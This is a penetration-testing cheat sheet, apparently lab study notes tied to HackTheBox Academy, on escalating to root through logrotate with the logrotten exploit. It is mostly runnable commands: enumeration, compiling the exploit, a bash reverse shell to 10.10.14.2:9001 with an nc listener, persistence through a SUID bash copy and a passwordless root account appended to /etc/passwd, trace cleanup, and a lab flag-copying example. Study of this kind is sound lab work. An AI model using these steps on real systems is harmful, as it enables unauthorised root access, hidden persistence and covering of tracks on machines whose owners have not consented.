### 1. Technique Name:

Logrotate – Privilege Escalation via Log File Injection (logrotten exploit)
### 2. Summary:

`logrotate` is a utility used to manage log files by rotating, compressing, and removing logs based on criteria like size or time. When misconfigured or used with vulnerable versions (e.g., 3.8.6, 3.11.0, 3.15.0, 3.18.0), it can allow a local attacker to escalate privileges. The attacker can inject a payload into a log file that will be executed with elevated privileges when `logrotate` processes the log.
### 3. Conditions / Requirements:

- Writable access to log file processed by logrotate (e.g., `/tmp/tmp.log`)    
- `logrotate` runs as a privileged user (typically via `cron`)
- System uses `create` directive in `logrotate.conf`
- Vulnerable version of `logrotate` (<= 3.18.0)
- Ability to execute or compile custom binaries
### 4. Enumeration Steps:
#### A. Check logrotate version:

```bash
logrotate --version
```
#### B. Inspect configuration:

```bash
cat /etc/logrotate.conf
```

Look for:

```
create
compress
```
#### C. Locate logrotate.d directory and list configurations:

```bash
ls /etc/logrotate.d/
cat /etc/logrotate.d/<target-service>
```
#### D. Confirm writable log file:

```bash
ls -l /path/to/logfile
```
#### E. Check logrotate state file (for last rotation time):

```bash
sudo cat /var/lib/logrotate.status
```
### 5. Exploitation Steps:
#### A. Clone and compile logrotten exploit:

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```
#### B. Prepare reverse shell payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
#### C. Start listener on attack machine:

```bash
nc -nlvp 9001
```
#### D. Run the exploit on a writable log file:

```bash
./logrotten -p ./payload /tmp/tmp.log
```
### 6. Post-Exploitation Tips:

- Upgrade shell:    

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Drop SUID shell for persistence:

```bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```

- Add root user (optional):

```bash
echo 'eviluser::0:0::/root:/bin/bash' >> /etc/passwd
```

- Clean up:

```bash
rm logrotten payload
```
### 7. Example / Notes:
#### A. Standard Exploit Example

Log File Used:

```bash
/tmp/tmp.log
```

Payload:

```bash
bash -i >& /dev/tcp/10.10.14.2/9001 0>&1
```

Exploit Execution:

```bash
./logrotten -p ./payload /tmp/tmp.log
```

Verification:

```bash
# id
uid=0(root) gid=0(root)
```
#### B. HackTheBox Academy Example – Flag Exfiltration
#### 1. SSH into Target:

```bash
ssh htb-student@10.129.204.41
```
#### 2. Compile logrotten on the target:

```bash
cd logrotten/
gcc -o logrotten logrotten.c
chmod +x logrotten
```
#### 3. Write payload to exfiltrate flag:

```bash
echo "cat /root/flag.txt > /home/htb-student/flag.txt" > payload
```
#### 4. Trigger log rotation and run exploit:

```bash
echo test >> /home/htb-student/backups/access.log
./logrotten /home/htb-student/backups/access.log -p payload
```
#### 5. Read the exfiltrated flag:

```bash
cat /home/htb-student/flag.txt
```

